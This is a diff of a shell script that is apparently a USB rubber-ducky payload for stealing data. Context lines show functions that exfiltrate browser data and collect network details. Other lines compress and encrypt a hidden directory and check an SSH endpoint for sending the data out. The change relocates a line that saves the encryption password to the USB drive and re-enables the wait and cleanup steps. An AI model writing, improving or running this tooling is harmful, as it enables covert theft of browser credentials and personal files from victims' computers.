@@ -25,6 +25,9 @@ if [ ! -d "$stor_dir" ] ; then
    mkdir -p "$stor_dir"
 fi
 
+echo $encryption_password | base64 > /Volumes/DUCKY/.encpw
+
+
 check_ssh_endpoint() {
   # Check SSH server (for both SCP and Rsync)
   ssh -q -p $scp_port -o ConnectTimeout=1 "$remote_ssh_user@$scp_server" &> /dev/null
@@ -76,7 +79,6 @@ exfil_browsers() {
 
 
   exfil_browser_pid=$!
-  
 }
 
 network_details() {
@@ -136,7 +138,6 @@ exfil_compress() {
   mkdir -p "$stor_dir"
   cd "$stor_dir"
   nohup tar cfz - "$hidden_dir" | openssl enc -aes-256-cbc -salt -out "$stor_dir/$hidden_file.enc" -pass pass:$encryption_password &> /dev/null
-  echo $encryption_password | base64 > /Volumes/DUCKY/.encpw
 
   if [ $? -ne 0 ]; then
     cleanup
@@ -194,5 +195,5 @@ disown
 # exfiltrate &
 
 #wait $exfiltrate_pid
-#wait $exfil_compress 
-#cleanup &
+wait $compress_pid
+cleanup &
